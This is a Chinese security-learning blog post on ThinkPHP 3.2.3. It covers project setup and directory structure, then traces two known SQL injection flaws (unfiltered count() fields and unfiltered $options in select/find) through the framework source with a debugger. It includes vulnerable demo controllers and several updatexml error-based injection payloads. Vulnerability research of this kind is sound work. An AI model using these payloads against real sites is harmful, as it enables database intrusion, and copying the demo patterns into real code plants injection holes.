# ThinkPHP3.2.3漏洞学习


ThinkPHP 漏洞学习
&lt;!--more--&gt;
# 环境搭建
`ThinkPHP3`

`composer create-project topthink/thinkphp=版本号 文件名`

`ThinkPHP5`(完整版)

`composer create-project topthink/think=版本号 文件名`

阿里云 Compose 全量镜像资源库

`composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/`

https://www.runoob.com/w3cnote/composer-install-and-usage.html

https://packagist.org/
# 框架了解
审计之前，我们需要了解框架的信息

[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)

`composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3`
```
index.php      入口文件
Application    应用目录
Public         资源文件目录
ThinkPHP       框架目录
```
其中框架目录`ThinkPHP`的结构如下
```
Common         核心公共函数目录
Conf           核心配置目录
Lang           核心语言包目录
Library        核心类库目录
    Think      核心Think类库目录
    Behavior   行为类库目录
    Org        Org类库目录
    Vendor     第三方类库目录
	...        更多类库目录
Mode           框架应用模式目录
Tpl            系统模板目录
ThinkPHP.php   框架入口文件
```
其中`Application`目录如下
```
Common         应用公共模块
    Common     应用公共函数目录
    Conf       应用公共配置文件目录
Home           默认生成的Home模块
    Conf       模块配置文件目录
    Common     模块函数公共目录
    Controller 模块控制器目录
    Model      模块模型目录
    View       模块视图文件目录
Runtime        运行时目录
    Cache      模板缓存目录
    Data       数据目录
    Logs       日志目录
    Temp       缓存目录
```
## 路由信息
thinkphp3使用 URL 模式切换：普通 GET 模式、pathinfo、rewrite 和兼容模式
`/ThinkPHP/Conf/convention.php`
```php
return array(
	&#34;URL_MODEL&#34; =&gt; 1
	//URL模式:0(普通模式) 1(PATHINFO 模式) 2(REWRITE模式) 3(兼容模式)
	//静态路由
	&#34;URL_ROUTE_ON&#34; =&gt; fasle,
	&#34;URL_ROUTE_RULES&#34; =&gt; array()
)
```
# 历史漏洞
## SQL 注入
### 0x01 聚合查询功能count方法未过滤调用parseKey
#### 利用条件
`ThinkPHP[5.0.0,5.0.23]，ThinkPHP 3 全版本`
### 漏洞分析和原理
`ThinkPHP3.2.3`
漏洞 demo
```java
public function SqlDemo(){
	$field = I(&#39;get.field&#39;);
	$num = M(&#39;user&#39;)-&gt;count($field);
	//M(&#39;user&#39;) 相当于 new Think\Model(&#39;user&#39;)
	var_dump($num);
}
```
poc
`?field=id),updatexml(1,concat(1,user(),1),1)from&#43;user%23`

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131922219.png)

在这里打个断点，跟进

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131922041.png)

会进入到`ThinkPHP/Library/Think/Model.class.php`中的`__call`方法中，
因为是`count`，所以进入到`$this-&gt;getField()`方法

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131928555.png)

经过对传入字段进行解析等一系列操作之后，

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131931608.png)

进入到`$this-&gt;db-&gt;select()`方法中
此时传入的`$options`变成了

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131932383.png)

继续跟进，这里进入到了`$this-&gt;buildSelectSql()`方法，来构建 select 语句

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131934433.png)

进入到`$this-&gt;parseSql()`方法中

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131934837.png)

利用`$this-&gt;parseField()`方法进行解析，继续跟进

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131938968.png)

这里的`$this-&gt;parseKey()`对传入的 payload 并没有进行过滤

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131939109.png)

然后便回到`$this-&gt;parseField()`方法中，返回构建的 field 语句

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131941304.png)

 最终回到`$this-&gt;parseSql()`方法中，返回最终需要执行的 sql 语句
 
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131942656.png)

最后得到了执行

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401131943511.png)


### 0x02 \_parseOptions未过滤$options导致 sql 注入
#### 利用条件
ThinkPHP &lt;= 3.2.3
#### 漏洞原理和分析
`$options`查询条件可以不经过数据处理直接进入`_parseOptions`，再进入`Driver.class.php`的sql操作函数，和上面一样通过`buildSelectsql`方法或直接调用`delete`方法进行拼接 sql 语句，然后再进行执行
漏洞 Demo
```java
public function SqlDemo()
{
    $id = I(&#39;id&#39;);
    $res = M(&#39;user&#39;)-&gt;select($id);
    $res = M(&#39;user&#39;)-&gt;find($id);
}
```
poc

`id[comment]=\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\*`

`id[limit]=1,1&#43;procdure&#43;analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)--`

`id[field]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --&#43;`

具体构造出多少个`poc`，可以看`pasexxx`有多少个



---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/  

